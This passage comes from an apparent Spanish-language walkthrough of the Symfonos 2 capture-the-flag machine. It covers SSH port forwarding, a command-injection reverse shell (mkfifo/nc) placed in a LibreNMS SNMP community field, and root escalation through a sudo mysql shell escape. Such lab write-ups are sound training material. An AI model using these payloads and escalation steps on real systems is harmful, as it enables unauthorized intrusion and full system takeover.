  35   │ root        22  0.0  0.0      0     0 ?        S<   Feb18   0:00 [crypto]
  36   │ root        23  0.0  0.0      0     0 ?        S<   Feb18   0:00 [kintegrityd]
  37   │ root        24  0.0  0.0      0     0 ?        S<   Feb18   0:00 [bioset]
  38   │ root        25  0.0  0.0      0     0 ?        S<   Feb18   0:00 [kblockd]
  39   │ root        26  0.0  0.0      0     0 ?        S<   Feb18   0:00 [devfreq_wq]
  40   │ root        27  0.0  0.0      0     0 ?        S<   Feb18   0:00 [watchdogd]
  41   │ root        28  0.0  0.0      0     0 ?        S    Feb18   0:00 [kswapd0]
  42   │ root        29  0.0  0.0      0     0 ?        S<   Feb18   0:00 [vmstat]
  43   │ root        41  0.0  0.0      0     0 ?        S<   Feb18   0:00 [kthrotld]
  44   │ root        42  0.0  0.0      0     0 ?        S<   Feb18   0:00 [ipv6_addrconf]
  45   │ root        75  0.0  0.0      0     0 ?        S<   Feb18   0:00 [ata_sff]
  46   │ root        83  0.0  0.0      0     0 ?        S    Feb18   0:00 [kworker/u2:1]
  47   │ root       103  0.0  0.0      0     0 ?        S    Feb18   0:00 [scsi_eh_0]
  48   │ root       104  0.0  0.0      0     0 ?        S<   Feb18   0:00 [scsi_tmf_0]
  49   │ root       105  0.0  0.0      0     0 ?        S    Feb18   0:00 [scsi_eh_1]
  50   │ root       106  0.0  0.0      0     0 ?        S<   Feb18   0:00 [scsi_tmf_1]
  51   │ root       108  0.0  0.0      0     0 ?        S<   Feb18   0:00 [mpt_poll_0]
  52   │ root       109  0.0  0.0      0     0 ?        S<   Feb18   0:00 [mpt/0]
  53   │ root       110  0.0  0.0      0     0 ?        S    Feb18   0:00 [scsi_eh_2]
  54   │ root       111  0.0  0.0      0     0 ?        S<   Feb18   0:00 [scsi_tmf_2]
  55   │ root       112  0.0  0.0      0     0 ?        S<   Feb18   0:00 [bioset]
  56   │ root       143  0.0  0.0      0     0 ?        S<   Feb18   0:00 [kworker/0:1H]
  57   │ root       168  0.0  0.0      0     0 ?        S<   Feb18   0:00 [kworker/u3:0]
  58   │ root       176  0.0  0.0      0     0 ?        S    Feb18   0:00 [jbd2/sda1-8]
  59   │ root       177  0.0  0.0      0     0 ?        S<   Feb18   0:00 [ext4-rsv-conver]
  60   │ root       205  0.0  0.6  56224  5056 ?        Ss   Feb18   0:00 /lib/systemd/systemd-journald
  61   │ root       210  0.0  0.0      0     0 ?        S    Feb18   0:00 [kauditd]
  62   │ root       244  0.0  0.5  45960  4184 ?        Ss   Feb18   0:00 /lib/systemd/systemd-udevd
  63   │ message+   345  0.0  0.4  45112  3680 ?        Ss   Feb18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --no
  64   │ root       364  0.0  0.3  29664  2864 ?        Ss   Feb18   0:00 /usr/sbin/cron -f
  65   │ root       366  0.0  0.4 250112  3240 ?        Ssl  Feb18   0:00 /usr/sbin/rsyslogd -n
  66   │ root       367  0.0  0.6  46496  4740 ?        Ss   Feb18   0:00 /lib/systemd/systemd-logind
  67   │ Debian-+   371  0.0  1.3  58248 10564 ?        Ss   Feb18   0:05 /usr/sbin/snmpd -Lsd -Lf /dev/null -u Debian-snmp -g 
  68   │ root       382  0.0  0.2  14524  1860 tty1     Ss+  Feb18   0:00 /sbin/agetty --noclear tty1 linux
  69   │ aeolus     392  0.0  0.3  17892  2540 ?        Ss   Feb18   0:00 proftpd: (accepting connections)
  70   │ mysql      491  0.0 11.0 653812 85248 ?        Ssl  Feb18   0:06 /usr/sbin/mysqld
  71   │ www-data   496  1.1  0.2  38944  2100 ?        Ss   Feb18   3:15 /usr/bin/webfsd -k /var/run/webfs/webfsd.pid -r /var/
  72   │ root       497  0.0  0.8  69952  6272 ?        Ss   Feb18   0:00 /usr/sbin/sshd -D
  73   │ root       511  0.0  0.3  20476  2804 ?        Ss   Feb18   0:00 /sbin/dhclient -nw
  74   │ root       513  0.0  4.7 410552 36756 ?        Ss   Feb18   0:00 /usr/sbin/apache2 -k start
  75   │ root       533  0.0  0.7 226256  6048 ?        Ss   Feb18   0:00 /usr/sbin/nmbd
  76   │ root       563  0.0  1.6 266440 12708 ?        Sl   Feb18   0:02 /usr/bin/python /usr/bin/fail2ban-server -b -s /var/r
  77   │ root       640  0.0  1.9 318192 15332 ?        Ss   Feb18   0:00 /usr/sbin/smbd
  78   │ root       650  0.0  0.7 310072  6104 ?        S    Feb18   0:00 /usr/sbin/smbd
  79   │ root       651  0.0  0.7 310088  5864 ?        S    Feb18   0:00 /usr/sbin/smbd
  80   │ systemd+   676  0.0  0.5 123072  3980 ?        Ssl  Feb18   0:00 /lib/systemd/systemd-timesyncd
  81   │ root       678  0.0  0.8 318176  6704 ?        S    Feb18   0:00 /usr/sbin/smbd
  82   │ cronus     684  0.0  3.2 411672 24632 ?        S    Feb18   0:00 /usr/sbin/apache2 -k start
  83   │ cronus     685  0.0  3.6 413668 28080 ?        S    Feb18   0:00 /usr/sbin/apache2 -k start
  84   │ cronus     686  0.0  2.9 411412 22940 ?        S    Feb18   0:00 /usr/sbin/apache2 -k start
  85   │ cronus     687  0.0  3.4 411624 26496 ?        S    Feb18   0:00 /usr/sbin/apache2 -k start
  86   │ cronus     688  0.0  4.0 413720 30908 ?        S    Feb18   0:00 /usr/sbin/apache2 -k start
  87   │ Debian-+   991  0.0  0.4  56148  3080 ?        Ss   Feb18   0:00 /usr/sbin/exim4 -bd -q30m
  88   │ root      2224  0.0  0.0      0     0 ?        S    00:48   0:01 [kworker/0:1]
  89   │ cronus    2300  0.0  1.5 410828 11900 ?        S    01:06   0:00 /usr/sbin/apache2 -k start
  90   │ cronus    2344  0.0  1.3 410584 10228 ?        S    01:12   0:00 /usr/sbin/apache2 -k start
  91   │ cronus    2345  0.0  1.3 410584 10228 ?        S    01:12   0:00 /usr/sbin/apache2 -k start
  92   │ cronus    2346  0.0  1.3 410584 10228 ?        S    01:12   0:00 /usr/sbin/apache2 -k start
  93   │ root      2645  0.0  0.0      0     0 ?        S    01:39   0:00 [kworker/u2:0]
  94   │ root      2681  0.1  0.0      0     0 ?        S    01:49   0:00 [kworker/0:2]
  95   │ root      2711  0.0  0.9  99348  6928 ?        Ss   01:55   0:00 sshd: aeolus [priv]
  96   │ aeolus    2713  0.0  0.8  64840  6284 ?        Ss   01:55   0:00 /lib/systemd/systemd --user
  97   │ aeolus    2714  0.0  0.2 166532  1736 ?        S    01:55   0:00 (sd-pam)
  98   │ aeolus    2720  0.0  0.6  99348  4752 ?        S    01:55   0:00 sshd: aeolus@pts/0
  99   │ aeolus    2721  0.0  0.6  21200  5008 pts/0    Ss   01:55   0:00 -bash
 100   │ aeolus    2736  0.0  0.4  38304  3256 pts/0    R+   01:57   0:00 ps aux
 101   │ aeolus@symfonos2:~$ ss -nltp
 102   │ State      Recv-Q Send-Q              Local Address:Port                             Peer Address:Port              
 103   │ LISTEN     0      80                      127.0.0.1:3306                                        *:*                  
 104   │ LISTEN     0      50                              *:139                                         *:*                  
 105   │ LISTEN     0      128                     127.0.0.1:8080                                        *:*                  
 106   │ LISTEN     0      32                              *:21                                          *:*                  
 107   │ LISTEN     0      128                             *:22                                          *:*                  
 108   │ LISTEN     0      20                      127.0.0.1:25                                          *:*                  
 109   │ LISTEN     0      50                              *:445                                         *:*                  
 110   │ LISTEN     0      50                             :::139                                        :::*                  
 111   │ LISTEN     0      64                             :::80                                         :::*                  
 112   │ LISTEN     0      128                            :::22                                         :::*                  
 113   │ LISTEN     0      20                            ::1:25                                         :::*                  
 114   │ LISTEN     0      50                             :::445                                        :::*                  
 115   │ aeolus@symfonos2:~$
```


nos conectamos y vemos uno puertos curiendo internamente haci que tica port fortwarding

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ ssh -L 8080:127.0.0.1:8080 aeolus@192.168.1.73
   3   │ aeolus@192.168.1.73's password: 
   4   │ Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64
   5   │ 
   6   │ The programs included with the Debian GNU/Linux system are free software;
   7   │ the exact distribution terms for each program are described in the
   8   │ individual files in /usr/share/doc/*/copyright.
   9   │ 
  10   │ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  11   │ permitted by applicable law.
  12   │ Last login: Tue Feb 18 17:32:39 2025 from 192.168.1.72
  13   │ aeolus@symfonos2:~$ sergioteamosergioteamosergioteamo^C
  14   │ aeolus@symfonos2:~$ ^C
  15   │ aeolus@symfonos2:~$
```


![](/assets/images/htb-writeup-symfonos2/inicio.png)


exploramos la pagina y vemos que en addhost


![](/assets/images/htb-writeup-symfonos2/snmp.png)

en hostname pondremos lo que sea

`en snmp on
en snmp version v2c en puerto nada en upda igual
port assocaition iflndex
y abajo pondermos una verse shell`

- '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f) #


```
        "hostname": hostname,
        "snmp": "on",
        "sysName": "",
        "hardware": "",
        "os": "",
        "snmpver": "v2c",
        "os_id": "",
        "port": "",
        "transport": "udp",
        "port_assoc_mode": "ifIndex",
        "community": payload,
        "authlevel": "noAuthNoPriv",
        "authname": "",
        "authpass": "",
        "cryptopass": "",
        "authalgo": "MD5",
        "cryptoalgo": "AES",
        "force_add": "on",
        "Submit": ""
```


![](/assets/images/htb-writeup-symfonos2/final.png)


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ nc -lvnp 1234
   3   │ listening on [any] 1234 ...
   4   │ connect to [192.168.1.72] from (UNKNOWN) [192.168.1.73] 60090
   5   │ /bin/sh: 0: can't access tty; job control turned off
   6   │ $ script /dev/null -c bash
   7   │ Script started, file is /dev/null
   8   │ cronus@symfonos2:/opt/librenms/html$ ^Z
   9   │ zsh: suspended  nc -lvnp 1234
  10   │                                                                                                                        
       │                                                 
  11   │ ┌──(noesholk㉿noes)-[~]
  12   │ └─$ stty raw -echo;fg      
  13   │ [3]    continued  nc -lvnp 1234
  14   │                                reset
  15   │ .htaccess             bandwidth-graph.php   index.php
  16   │ ajax_dash.php         billing-graph.php     install.php
  17   │ ajax_form.php         calendar.jpg          js/
  18   │ ajax_list.php         css/                  legacy/
  19   │ ajax_listports.php    csv.php               legacy_api_v0.php
  20   │ ajax_mapview.php      data.php              legacy_index.php
  21   │ ajax_ossuggest.php    favicon.ico           netcmd.php
  22   │ ajax_output.php       fonts/                network-map.php
  23   │ ajax_rulesuggest.php  graph-realtime.php    pages/
  24   │ ajax_search.php       graph.php             pdf.php
  25   │ ajax_table.php        images/               plugins/
  26   │ api_v0.php            includes/             robots.txt
  27   │ cronus@symfonos2:/opt/librenms/html$ reset xste
  28   │ .htaccess             bandwidth-graph.php   index.php
  29   │ ajax_dash.php         billing-graph.php     install.php
  30   │ ajax_form.php         calendar.jpg          js/
  31   │ ajax_list.php         css/                  legacy/
  32   │ ajax_listports.php    csv.php               legacy_api_v0.php
  33   │ ajax_mapview.php      data.php              legacy_index.php
  34   │ ajax_ossuggest.php    favicon.ico           netcmd.php
  35   │ ajax_output.php       fonts/                network-map.php
  36   │ ajax_rulesuggest.php  graph-realtime.php    pages/
  37   │ ajax_search.php       graph.php             pdf.php
  38   │ ajax_table.php        images/               plugins/
  39   │ api_v0.php            includes/             robots.txt
  40   │ cronus@symfonos2:/opt/librenms/html$           
  41   │ cronus@symfonos2:/opt/librenms/html$ 
  45   │ cronus@symfonos2:/opt/librenms/html$ export SHELL=bash
  46   │ cronus@symfonos2:/opt/librenms/html$ export TERM=xterm
  47   │ cronus@symfonos2:/opt/librenms/html$ sudo -l
  48   │ Matching Defaults entries for cronus on symfonos2:
  49   │     env_reset, mail_badpass,
  50   │     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  51   │ 
  52   │ User cronus may run the following commands on symfonos2:
  53   │     (root) NOPASSWD: /usr/bin/mysql
  54   │ cronus@symfonos2:/opt/librenms/html$ /usr/bin/mysql
  55   │ ERROR 1045 (28000): Access denied for user 'cronus'@'localhost' (using password: NO)
  70   │ cronus@symfonos2:/opt/librenms/html$ mysql -e '\! /bin/sh'
  71   │ ERROR 1045 (28000): Access denied for user 'cronus'@'localhost' (using password: NO)
  72   │ cronus@symfonos2:/opt/librenms/html$ sudo mysql -e '\! /bin/sh'
  82   │ # ls
  83   │ proof.txt
  84   │ # cat proof.txt
  85   │ 
  86   │         Congrats on rooting symfonos:2!
  87   │ 
  88   │            ,   ,
  89   │          ,-`{-`/
  90   │       ,-~ , \ {-~~-,
  91   │     ,~  ,   ,`,-~~-,`,
  92   │   ,`   ,   { {      } }                                             }/
  93   │  ;     ,--/`\ \    / /                                     }/      /,/
  94   │ ;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
  95   │ ; /   `       } } `, `-`-.___                            / `,  ,/  `,/
  96   │  \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  97   │   `        { {                                     __  /  ,`/   ,`,;
  98   │         /   \ \                                 _,`, `{  `,{   `,`;`
  99   │        {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
 100   │        \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
 101   │         `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
 102   │                    / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
 103   │                 /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
 104   │        /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
 105   │       /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
 106   │      / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
 107   │     / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
 108   │   /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
 109   │ /` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,
 110   │ 
 111   │         Contact me via Twitter @zayotic to give feedback!
```


https://gtfobins.github.io/gtfobins/mysql/


```
A valid MySQL server must be available.
Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

    mysql -e '\! /bin/sh'
```
